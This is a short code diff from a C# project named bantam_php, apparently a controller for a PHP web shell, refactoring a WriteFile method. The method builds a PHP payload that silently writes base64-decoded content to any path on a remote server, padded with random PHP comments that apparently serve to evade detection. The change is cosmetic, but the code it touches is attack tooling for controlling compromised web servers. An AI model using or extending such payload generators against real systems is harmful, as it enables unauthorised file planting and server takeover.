@@ -384,10 +384,9 @@ namespace bantam_php
         /// <returns></returns>
         public static string WriteFile(string remoteFileLocation, string b64FileContents, string flags = "0")
         {
-            string phpCode = RandomPHPComment()
-                           + "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'), " + flags + ");"
-                           + RandomPHPComment();
-            return phpCode;
+            return RandomPHPComment()
+                 + "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'), " + flags + ");"
+                 + RandomPHPComment();
         }
 
         /// <summary>
